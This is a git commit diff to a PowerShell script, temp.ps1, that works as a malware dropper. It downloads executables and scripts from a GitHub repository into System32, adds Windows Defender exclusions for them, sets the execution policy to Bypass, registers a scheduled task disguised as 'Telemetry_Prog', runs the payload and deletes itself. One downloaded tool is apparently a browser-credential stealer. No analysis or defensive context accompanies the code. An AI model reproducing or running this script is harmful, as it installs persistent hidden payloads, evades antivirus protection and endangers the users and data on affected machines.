bbe5cbb940bd8ce63e911d7438068f2750d50dc2
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-12-01 07:12:50 +0000

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -2,11 +2,12 @@
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "C:\Windows\System32\cleanup.ps1"
 # add exlusion to files
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
 # set execution policy
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
 # add schedule to start ddrcc.ps1
 # add variables for scheduler
 $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
@@ -18,5 +19,4 @@ Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trig
 & "C:\Windows\System32\ddrcc.ps1"
 # re-enable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $false
-Remove-Item -Path $MyInvocation.MyCommand.Source -Force https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1
-
+Remove-Item -Path $MyInvocation.MyCommand.Source -Force
